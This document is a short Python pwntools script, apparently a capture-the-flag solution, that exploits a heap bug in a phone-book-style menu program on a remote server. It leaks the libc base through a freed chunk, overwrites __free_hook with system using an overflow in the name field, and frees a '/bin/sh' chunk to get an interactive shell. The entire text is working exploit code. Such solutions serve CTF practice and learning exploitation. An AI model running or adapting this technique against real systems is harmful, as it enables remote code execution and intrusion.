from pwn import *
context(os='linux', arch='amd64', log_level='debug')
#io = process('./hello')
io = remote('61.147.171.105',61716)
libc = ELF('./libc-2.23.so')
main_arena_offset = libc.symbols["__malloc_hook"] + 0x10

def Add(number,name,des_size,des):
    io.sendlineafter('your choice>>','1')
    io.sendlineafter('phone number:',number)
    io.sendlineafter('name:',name)
    io.sendlineafter('input des size:',str(des_size))
    if des_size >= 0 :
        io.sendlineafter('des info:',des)

def Delete(index):
    io.sendlineafter('your choice>>','2')
    io.sendlineafter('input index:',index)
        
def Show(index):
    io.sendlineafter('your choice>>','3')
    io.sendlineafter('input index:',index)

def Edit(index,number,name,des_size,des):
    io.sendlineafter('your choice>>','4')
    io.sendlineafter('input index:',index)
    io.sendlineafter('phone number:',number)
    io.sendlineafter('name:',name)
    if des_size >= 0 :
        io.sendlineafter('des info:',des)

def exp():
    #step 1:leak libc
    Add('number','name',128,'des')#chunk0
    Add('number','name',12,'des')#chunk1
    Delete('0')
    Edit('0','number','name',-1,'')
    Show('0')
    io.recvuntil('des:')
    libc_base = u64(io.recv(6).ljust(8,'\x00')) - main_arena_offset - 88
    
    #step 2:boom
    Add('number','name',12,'/bin/sh\x00')  #chunk2
    free_hook = libc_base + libc.symbols['__free_hook']
    sys_addr = libc_base + libc.symbols['system']
    payload = 'a'*13 + p64(free_hook)
    Edit('1','number',payload,8,p64(sys_addr))
    Delete('2')
    io.interactive()

exp()